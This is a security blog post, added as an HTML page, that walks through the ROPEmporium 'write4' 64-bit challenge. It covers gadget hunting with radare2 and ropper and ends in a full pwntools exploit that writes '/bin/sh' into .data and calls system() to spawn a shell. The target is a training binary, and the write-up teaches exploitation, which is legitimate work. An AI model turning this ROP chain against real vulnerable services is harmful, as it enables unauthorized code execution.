@@ -1,0 +1,876 @@
+<!DOCTYPE html>
+<html>
+<head>
+
+    <!-- Document Settings -->
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+
+    <!-- Base Meta -->
+    <!-- dynamically fixing the title for tag/author pages -->
+
+
+
+    <title>ROPEmporium: 3-Write4 (64-bit)</title>
+    <meta name="HandheldFriendly" content="True" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <!-- Styles'n'Scripts -->
+    <link rel="stylesheet" type="text/css" href="/assets/built/screen.css" />
+    <link rel="stylesheet" type="text/css" href="/assets/built/screen.edited.css" />
+    <link rel="stylesheet" type="text/css" href="/assets/built/syntax.css" />
+    <!-- highlight.js -->
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/default.min.css">
+    <style>.hljs { background: none; }</style>
+
+    <!--[if IE]>
+        <style>
+            p, ol, ul{
+                width: 100%;
+            }
+            blockquote{
+                width: 100%;
+            }
+        </style>
+    <![endif]-->
+    
+    <!-- This tag outputs SEO meta+structured data and other important settings -->
+    <meta name="description" content="Security researching from the nordics" />
+    <link rel="shortcut icon" href="/assets/images/static/blog-icon.png" type="image/png" />
+    <link rel="canonical" href="/ropemporium-3-write4" />
+    <meta name="referrer" content="no-referrer-when-downgrade" />
+
+     <!--title below is coming from _includes/dynamic_title-->
+    <meta property="og:site_name" content="Securityits.io" />
+    <meta property="og:type" content="website" />
+    <meta property="og:title" content="ROPEmporium: 3-Write4 (64-bit)" />
+    <meta property="og:description" content="Moving on to the 4th instalment of this series with Write4 Continuing on the series of ROPEmporium, lets do number 3 “Write4”. Description On completing our usual checks for interesting strings and symbols in this binary we’re confronted with the stark truth that our favourite string “/bin/cat flag.txt” is not" />
+    <meta property="og:url" content="/ropemporium-3-write4" />
+    <meta property="og:image" content="/assets/images/posts/2019/12/ropemporium-3-write4/rop.jpg" />
+    <meta property="article:publisher" content="https://www.facebook.com/false" />
+    <meta property="article:author" content="https://www.facebook.com/false" />
+    <meta property="article:published_time" content="2019-12-03T00:00:00+00:00" />
+    <meta property="article:modified_time" content="2019-12-03T00:00:00+00:00" />
+    <meta property="article:tag" content="Exploit-dev" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="ROPEmporium: 3-Write4 (64-bit)" />
+    <meta name="twitter:description" content="Moving on to the 4th instalment of this series with Write4 Continuing on the series of ROPEmporium, lets do number 3 “Write4”. Description On completing our usual checks for interesting strings and symbols in this binary we’re confronted with the stark truth that our favourite string “/bin/cat flag.txt” is not" />
+    <meta name="twitter:url" content="/" />
+    <meta name="twitter:image" content="/assets/images/posts/2019/12/ropemporium-3-write4/rop.jpg" />
+    <meta name="twitter:label1" content="Written by" />
+    <meta name="twitter:data1" content="Securityits.io" />
+    <meta name="twitter:label2" content="Filed under" />
+    <meta name="twitter:data2" content="Exploit-dev" />
+    <meta name="twitter:site" content="@Securitybits_io" />
+    <meta name="twitter:creator" content="@Securitybits_io" />
+    <meta property="og:image:width" content="1400" />
+    <meta property="og:image:height" content="933" />
+
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Website",
+    "publisher": {
+        "@type": "Organization",
+        "name": "Securityits.io",
+        "logo": "/assets/images/static/blog-icon.png"
+    },
+    "url": "/ropemporium-3-write4",
+    "image": {
+        "@type": "ImageObject",
+        "url": "/assets/images/posts/2019/12/ropemporium-3-write4/rop.jpg",
+        "width": 2000,
+        "height": 666
+    },
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "/ropemporium-3-write4"
+    },
+    "description": "Moving on to the 4th instalment of this series with Write4 Continuing on the series of ROPEmporium, lets do number 3 “Write4”. Description On completing our usual checks for interesting strings and symbols in this binary we’re confronted with the stark truth that our favourite string “/bin/cat flag.txt” is not"
+}
+    </script>
+
+    <!-- <script type="text/javascript" src="https://demo.ghost.io/public/ghost-sdk.min.js?v=724281a32e"></script>
+    <script type="text/javascript">
+    ghost.init({
+    	clientId: "ghost-frontend",
+    	clientSecret: "f84a07a72b17"
+    });
+    </script> -->
+
+    <meta name="generator" content="Jekyll 3.6.2" />
+    <link rel="alternate" type="application/rss+xml" title="ROPEmporium: 3-Write4 (64-bit)" href="/feed.xml" />
+
+
+</head>
+<body class="post-template">
+
+    <div class="site-wrapper">
+        <!-- All the main content gets inserted here, index.hbs, post.hbs, etc -->
+        <!-- default -->
+
+<!-- The tag above means: insert everything in this file
+into the {body} of the default.hbs template -->
+
+<header class="site-header outer">
+    <div class="inner">
+        <nav class="site-nav">
+    <div class="site-nav-left">
+        
+            
+                <a class="site-nav-logo" href="/"><img src="/assets/images/static/blog-icon.png" alt="Securityits.io" /></a>
+            
+        
+        
+            <ul class="nav" role="menu">
+    <li class="nav-home" role="menuitem"><a href="/">Home</a></li>
+    <li class="nav-about" role="menuitem"><a href="/about/">About</a></li>
+    <li class="nav-github" role="menuitem"><a href="https://github.com/securitybits-io">Github</a></li>
+</ul>
+
+        
+    </div>
+    <div class="site-nav-right">
+        <div class="social-links">
+            
+            
+                <a class="social-link social-link-tw" href="https://twitter.com/Securitybits_io" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"/></svg>
+</a>
+            
+        </div>
+        
+    </div>
+</nav>
+
+    </div>
+</header>
+
+<!-- Everything inside the #post tags pulls data from the post -->
+<!-- #post -->
+
+<main id="site-main" class="site-main outer" role="main">
+    <div class="inner">
+
+        <article class="post-full  tag-exploit-dev post ">
+
+            <header class="post-full-header">
+                <section class="post-full-meta">
+                    <time class="post-full-meta-date" datetime=" 3 December 2019"> 3 December 2019</time>
+                    
+                        <span class="date-divider">/</span>
+                        
+                            
+                               <a href='/tag/exploit-dev/'>EXPLOIT-DEV</a>
+                            
+                        
+                    
+                </section>
+                <h1 class="post-full-title">ROPEmporium: 3-Write4 (64-bit)</h1>
+            </header>
+
+            
+            <figure class="post-full-image" style="background-image: url(/assets/images/posts/2019/12/ropemporium-3-write4/rop.jpg)">
+            </figure>
+            
+
+            <section class="post-full-content">
+                <div class="kg-card-markdown">
+                    <blockquote>
+  <p>Moving on to the 4th instalment of this series with Write4</p>
+</blockquote>
+
+<p>Continuing on the series of ROPEmporium, lets do number 3 “Write4”.</p>
+
+<h2 id="description">Description</h2>
+
+<blockquote>
+  <p>On completing our usual checks for interesting strings and symbols in this binary we’re confronted with the stark truth that our favourite string “/bin/cat flag.txt” is not present this time. Although you’ll see later that there are other ways around this problem, such as resolving dynamically loaded libraries and using the strings present in those, we’ll stick to the challenge goal which is learning how to get data into the target process’s virtual address space via the magic of ROP.</p>
+</blockquote>
+
+<h2 id="setup">Setup</h2>
+<p>There’s really nothing different from the other posts we’ve done so far. Download and unzip.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@linux:~/write4# wget https://ropemporium.com/binary/write4.zip
+root@linux:~/write4# unzip write4.zip
+root@linux:~/write4# ls
+flag.txt write4 write4.zip
+root@linux:~/write4# file write4
+write4: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=ab37f80904704258fda5656af18246786632b560, not stripped
+root@linux:~# checksec write4
+[*] '/root/Documents/courses/ropemporium/3-write4/write4'
+    Arch: amd64-64-little
+    RELRO: Partial RELRO
+    Stack: No canary found
+    NX: NX enabled
+    PIE: No PIE (0x400000)
+</code></pre></div></div>
+
+<p>As per usual, the binary is not stripped (Hint: none of them are!). Nothing that’s really not out of the ordinary, lets execute the binary to see the input/output.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>write4 by ROP Emporium
+64bits
+
+Go ahead and give me the string already!
+&gt; securitybits.io
+
+Exiting
+</code></pre></div></div>
+<p>Again nothing out of the ordinary, lets toss it into radare2 and have a look at the symbols.</p>
+
+<h2 id="radare2-reversing">Radare2 Reversing</h2>
+
+<p>Running radare2 with the triple A flag cuts down the time and analyzes the file immediately.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@linux:~# r2 write4 -AAA
+[Cannot analyze at 0x00400640g with sym. and entry0 (aa)
+[x] Analyze all flags starting with sym. and entry0 (aa)
+[... snip ...]
+[x] Enable constraint types analysis for variables
+ -- Experts agree, security holes suck, and we fixed some of them!
+[0x00400650]&gt; afl
+0x00400650 1 41 entry0
+0x00400610 1 6 sym.imp.__libc_start_main
+0x00400680 4 50 -&gt; 41 sym.deregister_tm_clones
+0x004006c0 4 58 -&gt; 55 sym.register_tm_clones
+0x00400700 3 28 entry.fini0
+0x00400720 4 38 -&gt; 35 entry.init0
+0x004007b5 1 82 sym.pwnme
+0x00400600 1 6 sym.imp.memset
+0x004005d0 1 6 sym.imp.puts
+0x004005f0 1 6 sym.imp.printf
+0x00400620 1 6 sym.imp.fgets
+0x00400807 1 17 sym.usefulFunction
+0x004005e0 1 6 sym.imp.system
+0x004008a0 1 2 sym.__libc_csu_fini
+0x004008a4 1 9 sym._fini
+0x00400830 4 101 sym.__libc_csu_init
+0x00400746 1 111 main
+0x00400630 1 6 sym.imp.setvbuf
+0x004005a0 3 26 sym._init
+[0x00400650]&gt;
+</code></pre></div></div>
+
+<p>Checking the <code class="language-plaintext highlighter-rouge">sym.usefulFunction</code> reveals that there’s a systemcall, but it calls <code class="language-plaintext highlighter-rouge">/bin/ls</code>. So the goal is to write <code class="language-plaintext highlighter-rouge">/bin/sh\x00</code> somewhere in the binary, and use the <code class="language-plaintext highlighter-rouge">system()</code> to execute the string.</p>
+
+<p><img src="assets/iamges/posts/2019/12/ropemporium-3-write4/image-1.png" alt="Radare2 useful symbols" /></p>
+
+<p>Finding a home for our string should be fairly trivial, as we should be able to put it into the <em>.data</em> section of the binary_._ As we can clearly see the perms on <em>.data</em> is <code class="language-plaintext highlighter-rouge">-rw- (read/write).</code></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[0x00400650]&gt; iS
+[Sections]
+Nm Paddr Size Vaddr Memsz Perms Name
+00 0x00000000 0 0x00000000 0 ----
+01 0x00000238 28 0x00400238 28 -r-- .interp
+[... snip ...]
+24 0x00001000 80 0x00601000 80 -rw- .got.plt
+25 0x00001050 16 0x00601050 16 -rw- .data
+26 0x00001060 0 0x00601060 48 -rw- .bss
+[... snip ...]
+30 0x00001800 738 0x00000000 738 ---- .strtab
+
+[0x00400650]&gt;
+</code></pre></div></div>
+<h2 id="findings-gadgets">Findings Gadgets</h2>
+
+<p>So to summarize:</p>
+
+<ul>
+  <li>Finding write primitive to write string to <em>.data</em> section</li>
+  <li>system address</li>
+  <li>pop_rdi (In order to put the <em>/bin/sh</em> string in a register)</li>
+</ul>
+
+<p>Fortunately, we have ropper!</p>
+
+<h3 id="pop_rdi">pop_rdi</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@linux:~# ropper -f write4 --search 'pop rdi'
+[INFO] Load gadgets from cache
+[LOAD] loading... 100%
+[LOAD] removing double gadgets... 100%
+[INFO] Searching for gadgets: pop rdi
+
+[INFO] File: write4
+0x0000000000400893: pop rdi; ret;
+</code></pre></div></div>
+<h3 id="system">System()</h3>
+
+<p>According to the <em>afl</em> output, pointing at <code class="language-plaintext highlighter-rouge">sym.imp.system</code>. It’s located at <code class="language-plaintext highlighter-rouge">0x004005e0</code> so lets use that address.</p>
+
+<h3 id="write-primitive">Write primitive</h3>
+
+<p>Now in order to be able to write to the <code class="language-plaintext highlighter-rouge">.data</code><em>,</em> we need find a mov gadget reading and writing from addresses we control. And pop gadgets to populate the registers.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@linux:~# ropper -f write4 --search "mov|pop"
+[INFO] Load gadgets from cache
+[LOAD] loading... 100%
+[LOAD] removing double gadgets... 100%
+[INFO] Searching for gadgets: mov|pop
+
+[INFO] File: write4
+0x0000000000400821: mov dword ptr [rsi], edi; ret;
+0x00000000004007ae: mov eax, 0; pop rbp; ret;
+0x00000000004005b1: mov eax, dword ptr [rax]; add byte ptr [rax], al; add rsp, 8; ret;
+0x00000000004005a5: mov eax, dword ptr [rip + 0x200a4d]; test rax, rax; je 0x5b5; call 0x640; add rsp, 8; ret;
+0x000000000040073c: mov ebp, esp; call rax;
+0x0000000000400809: mov ebp, esp; mov edi, 0x40090c; call 0x5e0; nop; pop rbp; ret;
+0x00000000004007a4: mov edi, 0x4008d7; call 0x5d0; mov eax, 0; pop rbp; ret;
+0x000000000040080b: mov edi, 0x40090c; call 0x5e0; nop; pop rbp; ret;
+0x00000000004006a0: mov edi, 0x601060; jmp rax;
+0x00000000004007fd: mov edi, eax; call 0x620; nop; leave; ret;
+0x0000000000400820: mov qword ptr [r14], r15; ret;
+0x00000000004005a4: mov rax, qword ptr [rip + 0x200a4d]; test rax, rax; je 0x5b5; call 0x640; add rsp, 8; ret;
+0x000000000040073b: mov rbp, rsp; call rax;
+0x0000000000400808: mov rbp, rsp; mov edi, 0x40090c; call 0x5e0; nop; pop rbp; ret;
+0x00000000004007fc: mov rdi, rax; call 0x620; nop; leave; ret;
+0x000000000040088c: pop r12; pop r13; pop r14; pop r15; ret;
+0x000000000040088e: pop r13; pop r14; pop r15; ret;
+0x0000000000400890: pop r14; pop r15; ret;
+0x0000000000400892: pop r15; ret;
+0x000000000040069f: pop rbp; mov edi, 0x601060; jmp rax;
+0x000000000040088b: pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
+0x000000000040088f: pop rbp; pop r14; pop r15; ret;
+0x00000000004006b0: pop rbp; ret;
+0x0000000000400893: pop rdi; ret;
+0x0000000000400891: pop rsi; pop r15; ret;
+0x000000000040088d: pop rsp; pop r13; pop r14; pop r15; ret;
+</code></pre></div></div>
+<p>The gadget at <code class="language-plaintext highlighter-rouge">0x00400820</code> looks simple enough, <code class="language-plaintext highlighter-rouge">mov qword ptr [r14], r15; ret;</code> a simple <code class="language-plaintext highlighter-rouge">mov to_ptr, from_ptr</code> then return. There is also a gadget at <code class="language-plaintext highlighter-rouge">0x00400890</code> which pops both registers from the stack! This will in turn give us control over the <em>to</em> and <em>from</em> registers.</p>
+
+<p>In the spirit of good exploit development lets put hat into a function which takes a piece of data, and an address to write it to!</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">arbitrary_write</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+    <span class="c1">#0x400890: pop r14; pop r15; ret;
+</span>    <span class="c1">#0x400820: mov qword ptr [r14], r15; ret;
+</span>    <span class="c1"># pop reg
+</span>    <span class="c1"># mov to_reg, from_reg
+</span>    <span class="c1"># address &gt; data &gt; pop r14; pop r15; mov
+</span>    <span class="n">pop_regs</span> <span class="o">=</span> <span class="mh">0x400890</span>
+    <span class="n">mov_regs</span> <span class="o">=</span> <span class="mh">0x400820</span>
+    <span class="n">rop</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_regs</span><span class="p">)</span>
+    <span class="n">rop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">address</span><span class="p">)</span>
+    <span class="n">rop</span> <span class="o">+=</span> <span class="n">data</span>
+    <span class="n">rop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">mov_regs</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">rop</span>
+</code></pre></div></div>
+<h2 id="putting-it-all-together">Putting it all together</h2>
+
+<p>Now I wont bore you with creating a template or finding the overflow offset, as that can be found in the earlier blog posts. Constructing the ROP Chain will look something like the following:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[junk] + arbitrary_write(.data, "/bin/sh\x00") + [pop_rdi] + [.data] + [system]
+</code></pre></div></div>
+<h3 id="final-exploit">Final exploit</h3>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#Author: Christoffer.Claesson@Securitybits.io
+#Blog: https://blog.securitybits.io/2019/12/03/ropemporium-3-write4-64-bit/
+</span>
+<span class="c1">#!/usr/bin/env python2
+# -*- coding: utf-8 -*-
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">exe</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'write4'</span><span class="p">)</span>
+
+<span class="n">host</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="n">HOST</span> <span class="ow">or</span> <span class="s">'127.0.0.1'</span>
+<span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">PORT</span> <span class="ow">or</span> <span class="mi">31337</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">local</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
+    <span class="s">'''Execute the target binary locally'''</span>
+    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="p">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="p">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">remote</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
+    <span class="s">'''Connect to the process on the remote host'''</span>
+    <span class="n">io</span> <span class="o">=</span> <span class="n">connect</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
+        <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">io</span>
+
+<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
+    <span class="s">'''Start the exploit against the target.'''</span>
+    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">LOCAL</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">local</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+
+<span class="n">gdbscript</span> <span class="o">=</span> <span class="s">'''
+break *0x{exe.symbols.main:x}
+break *0x400890
+break *0x400807
+continue
+'''</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>
+
+<span class="k">def</span> <span class="nf">arbitrary_write</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+    <span class="c1">#0x400890: pop r14; pop r15; ret;
+</span>    <span class="c1">#0x400820: mov qword ptr [r14], r15; ret;
+</span>    <span class="c1"># pop reg
+</span>    <span class="c1"># mov to_reg, from_reg
+</span>    <span class="c1"># address &gt; data &gt; pop r14; pop r15; mov
+</span>    <span class="n">pop_regs</span> <span class="o">=</span> <span class="mh">0x400890</span>
+    <span class="n">mov_regs</span> <span class="o">=</span> <span class="mh">0x400820</span>
+    <span class="n">rop</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_regs</span><span class="p">)</span>
+    <span class="n">rop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">address</span><span class="p">)</span>
+    <span class="n">rop</span> <span class="o">+=</span> <span class="n">data</span>
+    <span class="n">rop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">mov_regs</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">rop</span>
+
+<span class="c1"># [0x00400650]&gt; iS
+# Nm Paddr Size Vaddr Memsz Perms Name
+# 25 0x00001050 16 0x00601050 16 -rw- .data
+</span>
+<span class="c1">#0x400893: pop rdi; ret;
+</span>
+<span class="n">system</span> <span class="o">=</span> <span class="mh">0x4005e0</span>
+<span class="n">data_segment</span> <span class="o">=</span> <span class="mh">0x601050</span>
+<span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x400893</span>
+
+<span class="n">junk</span> <span class="o">=</span> <span class="s">'A'</span><span class="o">*</span><span class="mi">40</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">junk</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">arbitrary_write</span><span class="p">(</span><span class="n">data_segment</span><span class="p">,</span><span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">data_segment</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
+
+<span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
+<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">)</span>
+<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p><img src="assets/images/posts/2019/12/ropemporium-3-write4/image-2.png" alt="Flag" /></p>
+
+<p>GitHub: <a href="https://github.com/Securitybits-io/ROPEmporium">https://github.com/Securitybits-io/ROPEmporium</a></p>
+
+                </div>
+            </section>
+
+            <!-- Email subscribe form at the bottom of the page -->
+            
+
+            <footer class="post-full-footer">
+                <!-- Everything inside the #author tags pulls data from the author -->
+                <!-- #author-->
+                
+                    
+                        <section class="author-card">
+                            
+                                <img class="author-profile-image" src="/assets/images/pages/profile/christoffer/profile.jpg" alt="christoffer" />
+                            
+                            <section class="author-card-content">
+                                <h4 class="author-card-name"><a href="/author/christoffer">Christoffer Claesson</a></h4>
+                                
+                                    <p>I am Christoffer Claesson, a professional security researcher from Sweden who spends his days (and many nights) on red teaming, security deep dives, and homelab experiments. This blog is my way of giving back to the community by sharing lessons, notes, and the occasional side project that grew bigger than planned.</p>
+                                
+                            </section>
+                        </section>
+                        <div class="post-full-footer-right">
+                            <a class="author-card-button" href="/author/christoffer">Read More</a>
+                        </div>
+                    
+                
+                <!-- /author  -->
+            </footer>
+
+            <!-- If you use Disqus comments, just uncomment this block.
+            The only thing you need to change is "test-apkdzgmqhj" - which
+            should be replaced with your own Disqus site-id. -->
+            
+
+        </article>
+
+    </div>
+</main>
+
+<!-- Links to Previous/Next posts -->
+<aside class="read-next outer">
+    <div class="inner">
+        <div class="read-next-feed">
+            
+                
+                
+                
+                
+                    <article class="read-next-card"
+                        
+                            style="background-image: url(/assets/images/static/blog-cover.jpg)"
+                        
+                    >
+                        <header class="read-next-card-header">
+                            <small class="read-next-card-header-sitetitle">&mdash; Securityits.io &mdash;</small>
+                            
+                                <h3 class="read-next-card-header-title"><a href="/tag/exploit-dev/">Exploit-dev</a></h3>
+                            
+                        </header>
+                        <div class="read-next-divider"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 14.5s2 3 5 3 5.5-2.463 5.5-5.5S21 6.5 18 6.5c-5 0-7 11-12 11C2.962 17.5.5 15.037.5 12S3 6.5 6 6.5s4.5 3.5 4.5 3.5"/></svg>
+</div>
+                        <div class="read-next-card-content">
+                            <ul>
+                                
+                                
+                                  
+                                
+                                  
+                                
+                                  
+                                
+                                  
+                                
+                                  
+                                
+                                  
+                                
+                                  
+                                
+                                  
+                                    
+                                  
+                                
+                                  
+                                    
+                                        
+                                        
+                                            <li><a href="/ropemporium-2-callme">ROPEmporium: 2-Callme (64-bit)</a></li>
+                                        
+                                    
+                                  
+                                
+                                  
+                                    
+                                        
+                                        
+                                            <li><a href="/ropemporium-1-split">ROPEmporium: 1-Split (64-bit)</a></li>
+                                        
+                                    
+                                  
+                                
+                                  
+                                    
+                                        
+                                        
+                                            <li><a href="/ropemporium-0-ret2win">ROPEmporium: 0-Ret2Win (64-bit)</a></li>
+                                        
+                                    
+                                  
+                                
+                                  
+                                
+                                  
+                                
+                                  
+                                
+                                  
+                                
+                                  
+                                
+                                  
+                                
+                                  
+                                
+                            </ul>
+                        </div>
+                        <footer class="read-next-card-footer">
+                            <a href="/tag/exploit-dev/">
+                                
+                                    See all 3 posts  →
+                                
+                            </a>
+                        </footer>
+                    </article>
+                
+            
+
+            <!-- If there's a next post, display it using the same markup included from - partials/post-card.hbs -->
+            
+                
+
+    <article class="post-card post-template">
+        
+            <a class="post-card-image-link" href="/beats-7-5-0-on-pfsense">
+                <div class="post-card-image" style="background-image: url(/assets/images/posts/2019/12/beats-7-5-0-on-pfsense/314799.jpg)"></div>
+            </a>
+        
+        <div class="post-card-content">
+            <a class="post-card-content-link" href="/beats-7-5-0-on-pfsense">
+                <header class="post-card-header">
+                    
+                        
+                            
+                               <span class="post-card-tags">Homelab</span>
+                            
+                        
+                            
+                                <span class="post-card-tags">Security</span>
+                            
+                        
+                    
+
+                    <h2 class="post-card-title">Beats 7.5.0 on PFsense 2.4.4</h2>
+                </header>
+                <section class="post-card-excerpt">
+                    
+                        <p>
+  Long time wanting a beats client to PFSense which runs on FreeBSD, so lets compile it our self from source!
+
+
+</p>
+                    
+                </section>
+            </a>
+            <footer class="post-card-meta">
+                
+                    
+                        
+                        <img class="author-profile-image" src="/assets/images/pages/profile/christoffer/profile.jpg" alt="Christoffer Claesson" />
+                        
+                        <span class="post-card-author">
+                            <a href="/author/christoffer/">Christoffer Claesson</a>
+                        </span>
+                    
+                
+                <span class="reading-time">
+                    
+                    
+                      3 min read
+                    
+                </span>
+            </footer>
+        </div>
+    </article>
+
+            
+
+            <!-- If there's a previous post, display it using the same markup included from - partials/post-card.hbs -->
+            
+                
+
+    <article class="post-card post-template">
+        
+            <a class="post-card-image-link" href="/ropemporium-2-callme">
+                <div class="post-card-image" style="background-image: url(/assets/images/posts/2019/08/ropemporium-2-callme/pexels-photo.jpg)"></div>
+            </a>
+        
+        <div class="post-card-content">
+            <a class="post-card-content-link" href="/ropemporium-2-callme">
+                <header class="post-card-header">
+                    
+                        
+                            
+                                <span class="post-card-tags">Exploit-dev</span>
+                            
+                        
+                    
+
+                    <h2 class="post-card-title">ROPEmporium: 2-Callme (64-bit)</h2>
+                </header>
+                <section class="post-card-excerpt">
+                    
+                        <p>
+  Continuing the ROP Series with Callme, this time going through Calling conventions
+
+
+</p>
+                    
+                </section>
+            </a>
+            <footer class="post-card-meta">
+                
+                    
+                        
+                        <img class="author-profile-image" src="/assets/images/pages/profile/christoffer/profile.jpg" alt="Christoffer Claesson" />
+                        
+                        <span class="post-card-author">
+                            <a href="/author/christoffer/">Christoffer Claesson</a>
+                        </span>
+                    
+                
+                <span class="reading-time">
+                    
+                    
+                      3 min read
+                    
+                </span>
+            </footer>
+        </div>
+    </article>
+
+            
+
